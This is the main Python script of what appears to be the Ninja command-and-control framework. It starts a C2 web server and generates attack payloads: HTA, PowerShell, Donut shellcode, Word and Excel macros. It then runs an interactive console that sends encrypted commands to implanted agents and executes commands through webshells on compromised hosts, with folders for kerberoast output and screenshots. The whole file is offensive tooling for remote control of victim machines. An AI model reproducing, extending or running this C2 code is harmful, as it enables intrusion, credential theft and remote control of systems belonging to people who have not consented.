# Embedded file name: muddyc3.py
import _thread
import signal
import threading

from core import header
from core.cmd import *
from core.payloads import *
from rich.console import Console

console = Console()


# def signal_handler(sig, frame):
#    print("\r")
# console.print('\n[!] Exit by typing exit', style="bold red", end="")


def create_dirs(dirs):
    try:
        os.makedirs(dirs)
    except OSError:
        return


def NinjaCMD():
    """TODO:
    * Handle Ctrl+C and Ctrl+D [Done]
    * Disable verbose output of payloads..
    1- Explore and implement default tool colors
    2- Try to implement shlex
    3- Replace pretty tables with rich.tables for a pretty output
    4- Display listeners in a nicer way, payloads in boxes
    5- Add traceback and logging mechanism
    6- Add a functionality to store creds for users in a file for every specific campaign
    7- Learn more about c2 servers, increase your knowledge and have fun...
    """
    while True:
        try:
            readline.set_completer(Command_Completer)
            readline.parse_and_bind("tab: complete")
            readline.write_history_file(".history")
            if config.POINTER == 'main':
                command = console.input(f'[bold yellow]({config.BASE}:{config.POINTER})> [/ bold yellow]')
            elif config.POINTER == 'webshell':
                command = console.input(f'[bold cyan]({config.BASE}:{config.POINTER})[/bold cyan]')
            elif config.Implant_Type == 'agent':
                agent = str(config.AGENTS[config.POINTER][0])
                agent2 = config.AGENTS[config.POINTER][5]
                command = console.input(f'[bold green]({config.BASE} : Agent({agent})-{agent2}[/bold green]')
            elif config.Implant_Type == 'webshell':
                webshell1 = str(config.WEBSHELLS[config.POINTER][0])
                webshell2 = config.WEBSHELLS[config.POINTER][1]
                command = console.input(f'[bold red]({config.BASE} : webshell({webshell1})@{webshell2})[/bold red]')
            bcommand = command.strip().split()  # Recommended to use shlex (more reliable cmd parsing)

            if bcommand:
                if bcommand[0] in cmd.COMMANDS:
                    result = getattr(globals()['cmd'](), bcommand[0])(bcommand)
                elif bcommand[
                    0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'agent':
                    config.COMMAND[config.POINTER].append(encrypt(AESKey, command.strip()))

                elif bcommand[
                    0] not in cmd.COMMANDS and config.POINTER != 'main' and config.POINTER != 'webshell' and config.Implant_Type == 'webshell':
                    try:
                        _thread.start_new_thread(webshell.webshell_execute,
                                                 (config.WEBSHELLS[config.POINTER], command.strip(),))

                    except:
                        console.print("[!] Error: unable to start thread", style="bold red")
                        console.print_exception()
        except (EOFError, KeyboardInterrupt):  # Handles Ctrl+C and Ctrl+D (NO exit)
            console.print("\n[!] Type exit", style="bold red")
            continue


def main():
    create_dirs("payloads")
    create_dirs("downloads")
    create_dirs("file")
    create_dirs("images")
    create_dirs("DA")
    create_dirs("kerberoast")
    create_dirs("screenshots")

    # signal.signal(signal.SIGINT, signal_handler)
    header.Banner()

    # config.set_key()
    CC = []
    if config.HOST == "" or config.PORT == "":
        while len(CC) == 0:
            CC = console.input('[cyan][-] Enter a DN/IP:port for C&C: IP:Port: [/cyan]')
        CC = CC.split(':')
        config.set_port(CC[1])
        config.set_ip(CC[0])
    # proxy = input('Enter PROXY:')
    # if proxy:
    #    ip = proxy

    server = threading.Thread(target=webserver.main, args=())
    server.start()
    time.sleep(0.5)
    print('+' + '-' * 60 + '+')
    cmd().help()
    print('+' + '-' * 60 + '+')
    print(bcolors.OKBLUE + '(LOW):' + bcolors.ENDC)
    hta_paylods()
    print(bcolors.OKBLUE + '(MEDIUM):' + bcolors.ENDC)
    pwsh_job()
    print(bcolors.OKBLUE + '(HIGH):' + bcolors.ENDC)
    pwsh_file()
    pwsh_sct()
    simple_payloads()
    pwsh_base64()
    pwsh_base52()
    print('+' + '-' * 60 + '+')

    config.PAYLOAD()
    config.obfuscate()
    config.STAGER()
    cspayload()
    if not config.Donut:
        console.log("[!] Donut is Disabled so , kindly create a new campaign", style="bold red")
    else:
        donut_shellcode()
        config.migrator()
    cmd_shellcodex86()
    cmd_shellcodex64()
    word_macro()
    excel_macro()
    f = open(".history", "a").write("\n")
    readline.read_history_file(".history")
    try:
        console.print("[*] Loading registered webshell list", style="cyan")
        with open('.webshells', 'rb') as f:
            config.WEBSHELLS = pickle.load(f)
    except FileNotFoundError:
        console.print("[!] Webshell list file doesn't exist.", style="red")

    """Ninja Command line"""
    NinjaCMD()


if __name__ == '__main__':
    try:
        main()
    except Exception:
        console.print_exception()
